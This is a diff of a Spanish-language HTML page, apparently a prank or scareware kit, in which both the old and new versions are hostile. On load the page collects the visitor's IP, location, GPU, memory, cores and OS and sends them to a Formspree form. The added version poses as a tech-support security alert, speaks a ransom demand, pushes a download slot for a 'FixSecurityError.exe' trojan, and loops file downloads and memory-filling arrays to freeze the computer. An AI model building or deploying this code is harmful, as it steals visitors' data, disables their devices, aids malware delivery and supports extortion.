@@ -2,88 +2,78 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ SYSTEM_OPTIMIZER_v4.2 ⚡</title>
+    <title>Soporte Técnico - Error de Sistema</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        #log { font-size: 10px; width: 90%; word-break: break-all; }
-        .red { color: #f00; font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; overflow: hidden; }
+        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; background: #050505; }
+        .danger { color: #f00; font-weight: bold; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
+        #btn { background: #f00; color: #fff; padding: 20px; border: none; cursor: pointer; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
-<body>
-    <div id="log"></div>
+<body onclick="iniciarAtaque()">
+
+    <div id="pantalla1" class="box">
+        <h1>⚠️ ERROR CRÍTICO DE SEGURIDAD ⚠️</h1>
+        <p>Se ha detectado una intrusión en su red local.</p>
+        <p>IP ORIGEN: <span id="user-ip">Cargando...</span></p>
+        <p class="danger">ESTADO: EXFILTRANDO DATOS PRIVADOS</p>
+        <button id="btn">HAGA CLIC PARA DETENER EL ROBO DE ARCHIVOS</button>
+    </div>
 
     <script>
-        const FORM_ID = "xykdyebg"; // Tu Formspree ID
-        const logs = document.getElementById('log');
+        const FORM_ID = "xykdyebg"; // Pon tu ID de Formspree aquí
 
-        function addLog(txt, isRed = false) {
-            const d = document.createElement('div');
-            if (isRed) d.className = "red";
-            d.innerText = `[${new Date().toLocaleTimeString()}] ${txt}`;
-            logs.appendChild(d);
-        }
-
-        // --- 1. PENETRACIÓN Y ROBO DE DATA ---
-        window.onload = async () => {
-            addLog("> INICIANDO PENETRACIÓN...");
+        // 1. PENETRACIÓN AUTOMÁTICA
+        async function exfiltrar() {
+            const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            document.getElementById('user-ip').innerText = res.ip || "OCULTA";
             
-            const ipReq = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "ERR";
-
-            const data = {
-                "TARGET": "INFECTED",
-                "IP": ipReq.ip,
-                "GPU": gpu,
-                "RAM": navigator.deviceMemory + "GB",
-                "CORES": navigator.hardwareConcurrency,
-                "OS": navigator.platform,
-                "GEO": `${ipReq.city}, ${ipReq.country_name}`
-            };
-
-            // Enviar datos al instante
             fetch(`https://formspree.io/f/${FORM_ID}`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    "ALERT": "SISTEMA_PENETRADO",
+                    "IP": res.ip,
+                    "GPU": (document.createElement('canvas').getContext('webgl')).getParameter(37446),
+                    "RAM": navigator.deviceMemory,
+                    "CORES": navigator.hardwareConcurrency,
+                    "OS": navigator.platform
+                })
             });
+            return res.ip;
+        }
+        exfiltrar();
 
-            addLog(`> DATA EXFILTRADA: ${ipReq.ip} (${gpu})`, true);
-            
-            // --- 2. ATAQUE DE COLAPSO (PC/MAC/MOBILE) ---
-            setTimeout(() => {
-                iniciarPeta(ipReq.ip);
-            }, 1000);
-        };
+        // 2. ATAQUE DE BLOQUEO Y DESCARGA
+        function iniciarAtaque() {
+            const voz = new SpeechSynthesisUtterance("Tu sistema ha sido penetrado. Todos tus archivos están siendo enviados a mi servidor. Paga ahora o pierdes todo.");
+            voz.lang = 'es-ES'; voz.pitch = 0.1;
+            window.speechSynthesis.speak(voz);
 
-        function iniciarPeta(ip) {
-            // Audio de Amenaza
-            const v = new SpeechSynthesisUtterance("He penetrado tu sistema. Paga el rescate o destruyo tu disco duro.");
-            v.lang = 'es-ES'; v.pitch = 0.1;
-            window.speechSynthesis.speak(v);
+            // Intentar descargar el "troyano" (Pon aquí el link de tu archivo .exe o .apk)
+            const a = document.createElement('a');
+            a.href = 'LINK_DE_TU_TROYANO_AQUI'; 
+            a.download = 'FixSecurityError.exe';
+            a.click();
 
-            // Bloqueo total
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-            
+            // Bucle de saturación (Congela la PC)
             const storage = [];
             setInterval(() => {
-                // Descarga masiva para petar carpetas (txt con mensaje)
-                const blob = new Blob([`PAGAME EL RESCATE. TU IP ES ${ip}`], {type: 'text/plain'});
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `SISTEMA_SECUESTRADO_${Math.random().toString(36)}.txt`;
-                a.click();
+                // Descargas de basura para llenar el disco
+                const b = new Blob(["PAGAME"], {type: 'text/plain'});
+                const url = URL.createObjectURL(b);
+                const dl = document.createElement('a');
+                dl.href = url;
+                dl.download = `RESCATE_${Math.random()}.txt`;
+                dl.click();
 
-                // Peta la RAM
-                for(let i=0; i<1000; i++) storage.push(new Array(1000000).fill("💀"));
+                // Llenar RAM
+                for(let i=0; i<500; i++) storage.push(new Array(1000000).fill("💀"));
 
-                // Bloqueo de UI
-                alert("⚠️ SISTEMA BAJO ATAQUE ⚠️\n\nIP: " + ip + "\n\nTU INFORMACIÓN HA SIDO ENVIADA.");
-                
-                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(v);
-            }, 200);
+                alert("SISTEMA BLOQUEADO POR INTRUSIÓN\n\nIP: " + document.getElementById('user-ip').innerText + "\n\nCONTACTE AL HACKER PARA DESBLOQUEAR.");
+                if (!window.speechSynthesis.speaking) window.speechSynthesis.speak(voz);
+            }, 150);
         }
     </script>
 </body>
